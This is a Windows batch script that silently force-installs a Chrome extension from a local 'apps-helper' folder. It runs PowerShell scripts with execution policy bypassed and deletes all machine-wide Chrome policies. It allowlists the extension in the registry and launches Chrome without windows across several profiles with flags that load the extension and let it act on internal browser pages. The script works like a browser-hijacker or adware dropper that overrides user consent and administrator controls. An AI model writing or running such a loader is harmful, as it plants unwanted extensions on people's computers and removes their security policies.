@echo off

set version=1.0
set id=ahadfbdodjlhaenjigpaehpmlelflnag

set base32=HKLM\SOFTWARE
set base64=HKLM\SOFTWARE\WOW6432Node

set chrome=Google\Chrome

set ext_dir=User Data\Default\Extensions
set chrome_ext="%LocalAppdata%\%chrome%\%ext_dir%\%id%"

set helper=%LocalAppdata%\%chrome%\User Data\apps-helper
set file=%helper%\apps.crx

Powershell.exe -ExecutionPolicy Bypass -File %~dp0\chrome-pre.ps1

REG DELETE %base32%\Policies\%chrome% /f

REG DELETE %base32%\%chrome%\Extensions\%id% /f
REG DELETE %base64%\%chrome%\Extensions\%id% /f


REG ADD "%base32%\Policies\%chrome%\ExtensionInstallAllowlist" /v "1" /t REG_SZ /d %id% /f
REG ADD "%base32%\%chrome%\Extensions\%id%" /v "path" /t REG_SZ /d "%file%" /f
REG ADD "%base32%\%chrome%\Extensions\%id%" /v "version" /t REG_SZ /d %version% /f

REG ADD "%base64%\Policies\%chrome%\ExtensionInstallAllowlist" /v "1" /t REG_SZ /d %id% /f
REG ADD "%base64%\%chrome%\Extensions\%id%" /v "path" /t REG_SZ /d "%file%" /f
REG ADD "%base64%\%chrome%\Extensions\%id%" /v "version" /t REG_SZ /d %version% /f

start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory="Default" --no-startup-window --extensions-on-chrome-urls --load-extension="%helper%" --hide-crash-restore-bubble
start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory="Profile 1" --no-startup-window --extensions-on-chrome-urls --load-extension="%helper%" --hide-crash-restore-bubble
start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory="Profile 2" --no-startup-window --extensions-on-chrome-urls --load-extension="%helper%" --hide-crash-restore-bubble
start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory="Profile 3" --no-startup-window --extensions-on-chrome-urls --load-extension="%helper%" --hide-crash-restore-bubble
start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory="Profile 4" --no-startup-window --extensions-on-chrome-urls --load-extension="%helper%" --hide-crash-restore-bubble
start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory="Profile 5" --no-startup-window --extensions-on-chrome-urls --load-extension="%helper%" --hide-crash-restore-bubble

Powershell.exe -ExecutionPolicy Bypass -File %~dp0\chrome-post.ps1

if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 1")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 2")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 3")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 4")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 5")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 6")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 7")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 8")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 9")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 10")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 11")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 12")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 13")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 14")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 15")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 16")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 17")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 18")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 19")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 20")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 21")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 22")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 23")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 24")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 25")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 26")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 27")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 28")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 29")
if not exist %chrome_ext% (timeout 1 > NUL) else (echo "Wait 30")

timeout 8 > NUL